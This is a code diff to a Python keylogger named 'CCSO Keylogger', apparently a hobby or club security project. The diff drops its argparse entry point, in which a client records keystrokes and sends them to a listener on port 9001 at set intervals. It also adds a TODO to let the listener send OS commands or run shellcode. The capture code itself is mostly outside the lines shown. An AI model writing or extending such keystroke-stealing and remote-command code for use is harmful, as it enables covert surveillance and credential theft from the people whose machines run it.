@@ -1,6 +1,4 @@
-import argparse
 import os
-import textwrap
 import keyboard
 import sys
 import socket
@@ -17,11 +15,12 @@ from datetime import datetime
 # Master TODO
 # 1. Implement keyboard interrupt handling
 # 2. Add pretty colors :^)
+# 3. Add ability for listner to send os commands and/ or execute shellcode
 
 # Classes for good python developer standards :)!
 class Keylogger:
     # Constructor
-    def __init__(self):
+    def __init__(self, args):
         self.args = args
         self.log = ""
         self.interval = self.args.interval
@@ -237,21 +236,3 @@ class Keylogger:
             # Handle a CTRL-C
             except KeyboardInterrupt:
                 sys.exit(0)
-
-# Arg parse
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description='CCSO Keylogger', formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent('''Example:
-        Creating a listener: sudo python logger.py -l
-        Creating a client to log: sudo python logger.py
-    '''))
-    parser.add_argument('-l', '--listen', action='store_true', help='listen')
-    parser.add_argument('-p', '--port', type=int, default=9001, help='specified port')
-    parser.add_argument('-t', '--target', default='0.0.0.0', help='Specified IP, default is all interfaces')
-    parser.add_argument('-o', '--outfile', default='keys.log', help='Output file')
-    parser.add_argument('-i', '--interval', type=int, default=60, help='Interval to send keystrokes')
-    parser.add_argument('-oF', '--format', default='txt', help='Specify the format of the output logs')
-
-    args = parser.parse_args()
-
-    kl = Keylogger()
-    kl.start()
